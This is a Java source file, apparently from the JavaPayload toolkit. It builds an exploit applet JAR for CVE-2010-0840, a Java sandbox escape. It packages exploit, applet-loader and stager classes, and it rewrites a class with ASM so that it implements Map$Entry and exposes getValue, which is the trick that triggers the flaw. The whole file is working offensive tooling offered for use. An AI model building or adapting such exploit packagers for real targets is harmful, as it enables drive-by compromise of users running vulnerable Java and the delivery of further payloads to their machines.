package javapayload.builder;

import java.io.InputStream;
import java.util.jar.Manifest;

import org.objectweb.asm.ClassAdapter;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;

public class CVE_2010_0840_AppletJarBuilder {
	public static void main(String[] args) throws Exception {
		if (args.length == 0) {
			System.out.println("Usage: java javapayload.builder.CVE_2010_0840_AppletJarBuilder "+JarBuilder.ARGS_SYNTAX);
			return;
		}
		final Class[] baseClasses = new Class[] {
				javapayload.exploit.CVE_2010_0840.class,
				javapayload.exploit.CVE_2010_0840.MyAbstractMap.class,
				javapayload.loader.AppletLoader.class,
				javapayload.loader.AppletLoader.ReadyNotifier.class,
				javapayload.stager.Stager.class,
		};
		final ClassWriter cw = new ClassWriter(0);
		final ClassVisitor stagerVisitor = new ClassAdapter(cw) {

			public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {
				super.visit(version, access, name, signature, superName, new String[] { "java/util/Map$Entry" });
			}

			public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
				if (name.equals("getV"))
					name = "getValue";
				return super.visitMethod(access, name, desc, signature, exceptions);
			}
		};
		Class originalClass = javapayload.exploit.CVE_2010_0840.MyExpression.class;
		final InputStream is = originalClass.getResourceAsStream("/" + originalClass.getName().replace('.', '/') + ".class");
		new ClassReader(is).accept(stagerVisitor, ClassReader.SKIP_DEBUG);
		is.close();
		JarBuilder.buildJarFromArgs(args, "CVE_2010_0840_Applet", baseClasses, new Manifest(), originalClass.getName().replace('.', '/') + ".class", cw.toByteArray());
	}
}
